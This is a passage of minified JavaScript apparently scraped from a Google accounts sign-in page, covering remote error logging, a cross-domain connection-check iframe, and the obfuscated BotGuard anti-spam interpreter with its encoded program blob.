d},Gh;Gh=window.addEventListener?Gf:window.attachEvent?Gg:void 0;
var 
Gd=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1},Ge=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return
 Gc[a][b]};var Gi=function(){try{return new 
XMLHttpRequest}catch(c){for(var 
a=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],b=0;b<a.length;b++)try{return
 new ActiveXObject(a[b])}catch(d){}}return 
null},Gj=function(){this.request=Gi();this.parameters={}};
Gj.prototype.send=function(a,b){var c=[],d;for(d in this.parameters){var
 e=this.parameters[d];c.push(d+"="+encodeURIComponent(e))}var 
c=c.join("&"),f=this.request;f.open("POST",a,!0);f.setRequestHeader("Content-type","application/x-www-form-urlencoded");f.onreadystatechange=function(){4==f.readyState&&b({status:f.status,text:f.responseText})};f.send(c)};
Gj.prototype.get=function(a,b){var
 
c=this.request;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var
 Gl=function(a){this.g=a;this.u=this.m();if(null==this.g)throw new 
Gk("Empty module name");};G=Gl.prototype;G.m=function(){var 
a=window.location.pathname;return 
a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
G.i=function(a,b,c){var 
d=this.u,e=this.g||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var
 f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return 
d};G.send=function(a,b,c){var d=new Gj;d.parameters={};try{var 
e=this.i(a,b,c);d.get(e,function(){})}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};
G.warn=function(a,b){this.send("WARN",a,b)};G.info=function(a,b){this.send("INFO",a,b)};G.f=function(a){var
 b=this;return function(){try{return 
a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: 
"+c),c;}}};var Gk=function(){};var Gm=Gm||new 
Gl("uri"),Gn=/^(?:([^:/?#.]+):)?(?:\/\/(?:([^/?#]*)@)?([\w\d\-\u0100-\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\?([^#]*))?(?:#(.*))?$/,Go=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gp=function(a,b){var
 c=b.match(Gn)[1]||null,d=b.match(Gn)[3]||null;var 
e=d&&decodeURIComponent(d);d=Number(b.match(Gn)[4]||null)||null;if(!c||!e)return
 Gm.error("Invalid origin 
Exception",[String(b)]),!1;d||(d=Go(c));b=a.match(Gn)[1]||null;if(!b||b.toLowerCase()!=c.toLowerCase())return!1;
c=(c=a.match(Gn)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=e.toLowerCase())return!1;(a=Number(a.match(Gn)[4]||null)||null)||(a=Go(b));return
 d==a};var Gq=Gq||new 
Gl("check_connection"),Gr=null,Gs=null,Gt=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gt.prototype;G.h=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return
 Gq.error("CheckConnection result contains comma",[a]),!1;var 
c=b.value;b.value=c?c+","+a:a;return!0};G.w=function(a){return 
this.h(a,null)};G.v=function(a){return 
this.h(a,Gs)};G.l=function(a){a=a.match("^([^:]+):(\\d*):(\\d?)$");return!a||3>a.length?null:a[1]};
G.s=function(a,b){if(!Gp(this.c,a))return!1;if(this.a||!b)return!0;this.l(b)==this.b&&(this.v(b)||this.w(a),this.a=!0);return!0};G.o=function(){var
 a=this.c;var b="timestamp",c=String((new 
Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL 
Exception: "+a);return 
a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
G.j=function(){var
 
a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.o();a.id=this.b;Gr.appendChild(a)};
var
 Gu=function(a){return function(b){var 
c=b.origin.toLowerCase();b=b.data;for(var 
d=a.length,e=0;e<d&&!a[e].s(c,b);e++);}},Gv=function(){if(window.postMessage){var
 a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var 
b=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gr=document.getElementById(a))?b?(Gs=document.getElementById(b),a=!0):(Gq.error("Unable
 to locate the input element to storeCheckConnection result","new id: 
"+String(b)),a=!1):(Gq.error("Unable to locate the iframe anchor to 
append connection test iframe",
["element id: 
"+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Gq.error("Missing
 iframe URL in old 
configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var
 b=a.length,c=[],d=0;d<b;d++)c.push(new 
Gt(a[d].iframeUri,a[d].domainSymbol));Gh(window,"message",Gu(c));for(d=0;d<b;d++)c[d].j()}}}},Gw=function(){if(window.__CHECK_CONNECTION_CONFIG){var
 a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;
if(window.postMessage){var 
b=document.getElementById(a);b?b.value="1":Gq.error("Unable to locate 
the input element to storepostMessage test result",["element id: 
"+a])}}};G_checkConnectionMain=Gq.f(Gv);G_setPostMessageSupportFlag=Gq.f(Gw);
</script>
  <script>
  window.__CHECK_CONNECTION_CONFIG = {
  newResultElementId: 'checkConnection',
  domainConfigs: [{iframeUri: 
'https://accounts.youtube.com/accounts/CheckConnection?pmpo\x3dhttps%3A%2F%2Faccounts.google.com\x26v\x3d-1004665669',domainSymbol:
 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  iframeParentElementId: 'cc_iframe_parent',
  postMsgSupportElementId: 'pstMsg',
  msgContent: 'accessible'
  };
  G_setPostMessageSupportFlag();
  G_checkConnectionMain();
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? 
Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */Function('var 
m=function(D,n,X){if("object"==(n=typeof D,n))if(D){if(D instanceof 
Array)return"array";if(D instanceof Object)return 
n;if((X=Object.prototype.toString.call(D),"[object 
Window]")==X)return"object";if("[object Array]"==X||"number"==typeof 
D.length&&"undefined"!=typeof D.splice&&"undefined"!=typeof 
D.propertyIsEnumerable&&!D.propertyIsEnumerable("splice"))return"array";if("[object
 Function]"==X||"undefined"!=typeof D.call&&"undefined"!=typeof 
D.propertyIsEnumerable&&!D.propertyIsEnumerable("call"))return"function"}else
 return"null";else if("function"==n&&"undefined"==typeof 
D.call)return"object";return 
n},F=function(D,n,X,l,Z){for(l=X=(n=[],0);l<D.length;l++)Z=D.charCodeAt(l),128>Z?n[X++]=Z:(2048>Z?n[X++]=Z>>6|192:(55296==(Z&64512)&&l+1<D.length&&56320==(D.charCodeAt(l+1)&64512)?(Z=65536+((Z&1023)<<10)+(D.charCodeAt(++l)&1023),n[X++]=Z>>18|240,n[X++]=Z>>12&63|128):n[X++]=Z>>12|224,n[X++]=Z>>6&63|128),n[X++]=Z&63|128);return
 n},L=this,y=(new 
function(){},function(D,n,X,l){for(l=n-1,X=[];0<=l;l--)X[n-1-l]=D>>8*l&255;return
 
X}),P=function(D,n,X,l){try{for(l=0;79669387488!=l;)D+=(n<<4^n>>>5)+n^l+X[l&3],l+=2489668359,n+=(D<<4^D>>>5)+D^l+X[l>>>11&3];return[D>>>24,D>>16&255,D>>8&255,D&255,n>>>24,n>>16&255,n>>8&255,n&255]}catch(Z){throw
 Z;}},p=function(D,n){for(n=[];D--;)n.push(255*Math.random()|0);return 
n},G=function(D,n){D.S.splice(0,0,n)},h=function(D,n,X,l,Z){if(X=n[0],1==X)D.O=25,D.G(n);else
 
if(2==X){l=n[X=n[1],3];try{D.i=false,Z=D.G(n)}catch(r){O(D,r),Z=D.Z}X&&X(Z),l.push(Z)}else
 if(3==X)D.G(n);else if(4==X)D.G(n);else 
if(5==X)D.i=false,n=n[1],n();else if(6==X)return 
Z=n[2],w(D,213,n[6]),w(D,162,Z),D.G(n)},N=function(D,n,X,l){(((((((((((((l=((((((((((((((((D.v=0,D).J=0,D).P=function(D,n,X){return(n=(X=function(){return
 D},function(){return 
X()}),n)[this.B]=function(Z){D=Z},n},D.N=[],D).O=25,D.L=false,D.I=function(D,n,X,l,A,b){return
 D=((b=(X=(A=function(){return l()},l=function(){return 
l[X.b+(A[X.f]===n)-!b[X.f]]},this),X.G),A[X.B]=function(D){l[X.h]=D},A)[X.B](D),A)},D.A=[],w(D,31,0),w)(D,95,0),w)(D,97,[165,0,0]),w(D,181,function(D,n,X,l){(l=(n=g(D),X=g(D),g)(D),D.R(n))[D.R(X)]=D.R(l)}),w)(D,219,function(D,n,X,l){n=(n=g(D),X=g(D),l=g(D),X=D.R(X),D.R(n)),w(D,l,n[X])}),w(D,27,function(D,n,X,l,A,b,J){if(!Y(D,1)){if("object"==(A=(l=(X=(X=(n=g(D),g)(D),l=g(D),A=g(D),n=D.R(n),D.R(X)),D.R(l)),D.R(A)),m)(n)){for(J
 in 
b=[],n)b.push(J);n=b}for(J=(b=0,n).length;b<J;b+=l)X(n.slice(b,b+l),A);Y(D,0)}}),w)(D,77,function(D,n,X,l){l=(X=(n=g(D),g(D)),g)(D),w(D,l,(D.R(n)in
 
D.R(X))+0)}),w)(D,235,[]),w)(D,4,2048),w)(D,64,function(D,n,X){(X=(n=g(D),g)(D),w)(D,X,""+D.R(n))}),D).c=function(D,n){((n.push(D[0]<<24|D[1]<<16|D[2]<<8|D[3]),n).push(D[4]<<24|D[5]<<16|D[6]<<8|D[7]),n).push(D[8]<<24|D[9]<<16|D[10]<<8|D[11])},w(D,48,function(D){S(D,4)}),w(D,140,L),w)(D,243,function(D,n,X,l,A){X=(A=(X=(n=g(D),g)(D),l=D.R(g(D)),D).R(g(D)),D).R(X),w(D,n,V(D,X,l,A))}),D.i=false,w(D,139,function(D){H(D,4)}),w(D,203,function(D,n,X,l,A,b,J){Y(D,1)||(n=e(D),A=n.W,l=n.M,X=n.s,J=X.length,0==J?b=new
 l[A]:1==J?b=new l[A](X[0]):2==J?b=new l[A](X[0],X[1]):3==J?b=new 
l[A](X[0],X[1],X[2]):4==J?b=new 
l[A](X[0],X[1],X[2],X[3]):I(D,22),w(D,n.X,b),Y(D,0))}),w(D,222,[]),w)(D,54,D),w(D,115,function(D,n,X){n=(n=g(D),X=g(D),D.N[n]&&D.R(n)),w(D,X,n)}),w)(D,86,function(D,n,X,l,A){for(n=g(D),X=C(D),A=0,l=[];A<X;A++)l.push(g(D));w(D,n,l)}),w)(D,21,0),X.Y)||function(){},w)(D,170,function(){}),w(D,212,function(D,n,X){Y(D,1)||(n=g(D),X=g(D),w(D,X,function(D){return
 
eval(D)}(D.R(n))),Y(D,0))}),D.S=[],w(D,163,function(D,n){Y(D,1)||(n=e(D),w(D,n.X,n.W.apply(n.M,n.s)),Y(D,0))}),w(D,43,function(D){D.D(4)}),w)(D,55,0),w(D,217,function(D,n,X,l,A,b,J,a,T,k){if(l=(X=(n=g(D),C(D)),""),void
 
0!=D.N[224])for(A=D.R(224),J=A.length,b=0;X--;)b=(b+C(D))%J,l+=A[b];else{for(l=(A=0,[]);A<X;A++)l.push(g(D));for(b=A=(X=[],0);A<l.length;)J=l[A++],128>J?X[b++]=String.fromCharCode(J):191<J&&224>J?(a=l[A++],X[b++]=String.fromCharCode((J&31)<<6|a&63)):239<J&&365>J?(a=l[A++],T=l[A++],k=l[A++],J=((J&7)<<18|(a&63)<<12|(T&63)<<6|k&63)-65536,X[b++]=String.fromCharCode(55296+(J>>10)),X[b++]=String.fromCharCode(56320+(J&1023))):(a=l[A++],T=l[A++],X[b++]=String.fromCharCode((J&15)<<12|(a&63)<<6|T&63));l=X.join("")}w(D,n,l)}),w)(D,210,function(D){S(D,1)}),w)(D,18,function(D,n,X){(X=(n=g(D),g(D)),w)(D,X,D.R(X)+D.R(n))}),w(D,74,74),w(D,215,function(D,n){(D=(n=g(D),D).R(n),D[0]).removeEventListener(D[1],D[2],false)}),w)(D,187,function(D,n,X,l){l=(X=(n=g(D),g(D)),g)(D),w(D,l,D.R(n)>>X)}),w)(D,76,0),D.K=[],w(D,142,p(4)),w(D,129,function(D,n,X,l,A){l=(X=(n=(l=(n=g(D),X=g(D),g)(D),D.R(n)),A=D.R(g(D)),D).R(X),D.R(l)),0!==n&&(l=V(D,l,A,1,n,X),n.addEventListener(X,l,q),w(D,55,[n,X,l]))}),w)(D,56,function(D,n,X){(X=(n=g(D),g(D)),n=D.R(n),w)(D,X,m(n))}),w)(D,165,function(D,n,X,l){(l=(X=(n=g(D),g)(D),g(D)),D.R(n)==D.R(X))&&w(D,l,D.R(l)+1)}),w)(D,96,0),w)(D,34,function(D,n){(n=D.R(g(D)),E)(D,n)}),w(D,80,function(D,n,X){0!=(X=(n=g(D),g)(D),D.R(n))&&w(D,31,D.R(X))}),w(D,162,{}),w)(D,229,function(D,n,X,l){if(n=D.K.pop()){for(X=g(D);0<X;X--)l=g(D),n[l]=D.N[l];n[222]=D.N[222],n[4]=D.N[4],D.N=n}else
 
w(D,31,D.a.length)}),w(D,137,function(D){H(D,1)}),w(D,174,function(D,n,X,l,A){for(n=[],X=g(D),l=0;l<X;l++)A=g(D),n.push(D.R(A));X=g(D),w(D,X,function(D,X){D.v++;try{for(X=0;X<n.length;X++)(0,n[X])(D)}finally{D.v--}})}),w(D,103,function(D){D.i&&K(D,0)}),w(D,127,function(D){H(D,2)}),w)(D,245,function(D,n,X,l){(l=(n=g(D),X=g(D),g(D)),w)(D,l,D.R(n)||D.R(X))}),n&&"!"==n.charAt(0))?(D.Z=n,l()):(X=!!X.Y,D.i=X,D.a=[],G(D,[4,n]),G(D,[5,l]),v(D,false,X,true))},t=function(D,n,X,l,Z,r,M,B,A){D.v++;try{for(X=(l=5001,M=(r=void
 
0,0),Z=20,D.a.length);(--l||D.H)&&(M=D.R(31))<X;)try{w(D,95,M),B=g(D),(r=D.R(B))&&r.call?r(D):I(D,21,0,B),0>Z--&&(Y(D,0),Z=20)}catch(b){b!=D.F&&(A=D.R(74),74!=A?(w(D,A,b),w(D,74,74)):I(D,22,b))}l||I(D,33)}catch(b){try{I(D,22,b)}catch(J){O(D,J)}}return
 
X=D.R(162),n&&w(D,31,n),D.v--,X},W=function(D,n,X,l,Z){for(;D.S.length;){if(X&&n&&d(D)){Z=D,D.j(function(){v(Z,false,n,false)});break}l=(l=(X=true,D.S.pop()),h(D,l))}return
 l},w=function(D,n,X){if(31==n||95==n)if(D.N[n])D.N[n][D.B](X);else 
D.N[n]=D.P(X);else 
if(97!=n&&142!=n&&235!=n&&222!=n||!D.N[n])D.N[n]=D.I(X,D.R);21==n&&(D.g=void
 
0,w(D,31,D.R(31)+4))},S=function(D,n,X,l){(l=(X=g(D),g(D)),c)(D,l,y(D.R(X),n))},e=function(D,n,X,l,Z,r){for(r=(Z=(X=(n={},g)(D),n.X=g(D),n.s=[],l=g(D)-1,g(D)),0);r<l;r++)n.s.push(g(D));for(n.W=D.R(X),n.M=D.R(Z);l--;)n.s[l]=D.R(n.s[l]);return
 
n},O=function(D,n){D.Z=("E:"+n.message+":"+n.stack).slice(0,2048)},g=function(D,n,X){if(n=D.R(31),!(n
 in D.a))throw I(D,31),D.F;return((void 0==D.g&&(D.g=f(D.a,n-4),D.U=void
 
0),D).U!=n>>3&&(D.U=n>>3,X=[0,0,0,D.R(21)],D.u=P(D.g,D.U,X)),w)(D,31,n+1),D.a[n]^D.u[n%8]},I=function(D,n,X,l,Z){(X=(l=((Z=D.R(95),n=[n,Z>>8&255,Z&255],void
 0!=l&&n.push(l),0)==D.R(222).length&&(D.N[222]=void 
0,w(D,222,n)),""),X&&(X.message&&(l+=X.message),X.stack&&(l+=":"+X.stack)),D).R(4),3<X)&&(l=l.slice(0,X-3),X-=l.length+3,l=F(l.replace(/\\r\\n/g,"\\n")),c(D,142,y(l.length,2).concat(l),12)),w(D,4,X)},Q=function(D,n){try{N(this,D,n)}catch(X){O(this,X)}},C=(((((Q.prototype.G=function(D,n,X,l,Z){if(4==(n=D[0],n)){D=D[1];try{for(l=n=(X=atob(D),D=[],0);l<X.length;l++){for(Z=X.charCodeAt(l);255<Z;)D[n++]=Z&255,Z>>=8;D[n++]=Z}this.a=D}catch(r){I(this,17,r)}t(this)}else
 
if(1==n)X=D[2],Z=D[1],X.push(this.R(97).length,this.R(142).length,this.R(235).length,this.R(4)),this.i=Z,w(this,162,D[3]),this.N[247]&&x(this,this.R(247));else{if(2==n){if(D=((Z=(((n=(Z=((D=y((X=D[2],this.R(97).length+2),2),Z=this.R(222),0<Z.length)&&c(this,97,y(Z.length,2).concat(Z),15),this.R(76))&511,Z-=this.R(97).length+5,this).R(142),4)<n.length&&(Z-=n.length+3),0<Z)&&c(this,97,y(Z,2).concat(p(Z)),10),4<n.length&&c(this,97,y(n.length,2).concat(n),153),p(2).concat(this.R(97))),Z[1]=Z[0]^3,Z[3]=Z[1]^D[0],Z)[4]=Z[1]^D[1],window).btoa){for(l=0,n="";l<Z.length;l+=8192)n+=String.fromCharCode.apply(null,Z.slice(l,l+8192));D=D(n).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,"")}else
 D=void 0;if(D)D="!"+D;else 
for(n=0,D="";n<Z.length;n++)l=Z[n][this.B](16),1==l.length&&(l="0"+l),D+=l;return((this.R(97).length=X[0],this.R(142).length=X[1],this.R(235)).length=X[2],Z=D,w)(this,4,X[3]),Z}if(3==n)x(this,D[1]);else
 if(6==n)return 
x(this,D[1])}},Q.prototype).f="caller",Q.prototype).C=(window.performance||{}).now?function(){return
 window.performance.now()|0}:function(){return+new 
Date},Q.prototype).B="toString",Q).prototype.j=L.requestIdleCallback?function(D){requestIdleCallback(D,{timeout:4})}:L.setImmediate?function(D){setImmediate(D)}:function(D){setTimeout(D,0)},function(D,n){return(n=g(D),n&128)&&(n=n&127|g(D)<<7),n}),v=(Q.prototype.o=function(D,n,X,l){try{l=D[(n+2)%3],D[n]=D[n]-D[(n+1)%3]-l^(1==n?l<<X:l>>>X)}catch(Z){throw
 Z;}},function(D,n,X,l,Z,r){if(0==D.S.length)return 
r;if(Z=0==D.v)D.l=D.C();return(r=W(D,X,l),Z)&&(X=D.C()-D.l,X<(n?10:0)||0>=D.O--||D.A.push(254>=X?X:254)),r}),K=(Q.prototype.D=function(D,n,X,l){(((l=(X=(D&=(n=D&4,3),g)(this),g(this)),X=this.R(X),n)&&(X=F((""+X).replace(/\\r\\n/g,"\\n"))),D)&&c(this,l,y(X.length,2)),c)(this,l,X)},function(D,n){((n=D.R(31)-n,w)(D,31,D.a.length),D).S.push([3,n])}),E=((Q.prototype.b=35,Q).prototype.zS=function(D,n,X,l,Z,r){for(r=l=(X=[],0);r<D.length;r++)for(Z=Z<<n|D[r],l+=n;7<l;)l-=8,X.push(Z>>l&255);return
 X},function(D,n){(D.K.push(D.N.slice()),D).N[31]=void 
0,w(D,31,n)}),c=function(D,n,X,l,Z,r){for((Z=D.R(n),142==n?(n=function(D,n,X,l){if((X=(n=Z.length,n)-4>>3,Z.V)!=X){X=((l=(Z.V=X,[0,0,0,r]),X)<<3)-4;try{Z.$=P(f(Z,X),f(Z,X+4),l)}catch(J){throw
 
J;}}Z.push(Z.$[n&7]^D)},r=D.R(96)):n=function(D){Z.push(D)},l)&&n(l&255),l=0,D=X.length;l<D;l++)n(X[l])},q=false,H=function(D,n,X,l){for(X=g(D),l=0;0<n;n--)l=l<<8|g(D);w(D,X,l)},f=function(D,n){return
 
D[n]<<24|D[n+1]<<16|D[n+2]<<8|D[n+3]},x=(Q.prototype.T=function(D,n,X,l,Z,r){if(this.Z)return
 
this.Z;try{Z=[],r=[],l=!!D,G(this,[1,l,Z,n]),G(this,[2,D,Z,r]),v(this,false,l,true),X=r[0]}catch(M){O(this,M),X=this.Z,D&&D(X)}return
 
X},function(D,n,X){return((X=D.R(31),D.a&&X<D.a.length)?(w(D,31,D.a.length),E(D,n)):w(D,31,n),t)(D,X)}),V=function(D,n,X,l,Z,r){return
 function(){var M,B=l&1,A=[6,n,X,void 0,Z,r,arguments];return 
l&2?(G(D,A),M=v(D,true,false,false)):B&&D.S.length?G(D,A):B?(G(D,A),v(D,true,false,false)):M=h(D,A),M}},Y=(((Q.prototype.Nd=function(D,n,X,l){for(;X--;)31!=X&&95!=X&&n.N[X]&&(n.N[X]=n[l](n[D](X),this));n[D]=this},Q).prototype.h=36,Q.prototype).w=function(D,n,X){return(n=(n^=n<<13,n^=n>>17,(n^n<<5)&X))||(n=1),D^n},function(D,n){if(0>=D.J||1<D.v||D.C()-D.l<D.J)return
 false;return 
D.L=true,K(D,n),true}),d=(Q.prototype.H=false,function(D){if(D.J){if(!D.L)return
 false;D.L=false}else if(10>D.C()-D.l)return false;return 
0!=document.hidden?false:true});(((Q.prototype.Ro=function(D,n,X,l,Z){for(Z=l=0;Z<D.length;Z++)l+=D.charCodeAt(Z),l+=l<<10,l^=l>>6;return(l=(D=(l+=l<<3,l^=l>>11,l)+(l<<15)>>>0,new
 
Number(D&(1<<n)-1)),l)[0]=(D>>>n)%X,l},Q.prototype).R=function(D,n){if(void
 0===(n=this.N[D],n))throw I(this,30,0,D),this.F;return 
n()},Q.prototype).m=function(D,n,X){if(3==D.length){for(X=0;3>X;X++)n[X]+=D[X];for(D=[13,8,13,12,16,5,3,10,(X=0,15)];9>X;X++)n[3](n,X%3,D[X])}},Q).prototype.F={};try{window.addEventListener("unload",function(){},q),window.addEventListener("test",null,Object.defineProperty({},"passive",{get:function(){q={passive:true}}}))}catch(D){}var
 
U=(L.botguard||(L.botguard={}),L.botguard);(U.BKG=function(D,n,X){(X=new
 
Q(D,{Y:n}),this).invoke=function(D,n,r){return(r=X.T(n&&D,r),D)&&!n&&D(r),r}},U).bg=function(D,n,X){return
 D&&D.substring&&(X=U[D.substring(0,3)])?new X(D.substring(3),n):new 
U.BKG(D,n)};')();</script>
  <script type="text/javascript">
  document.bg = new 
botguard.bg('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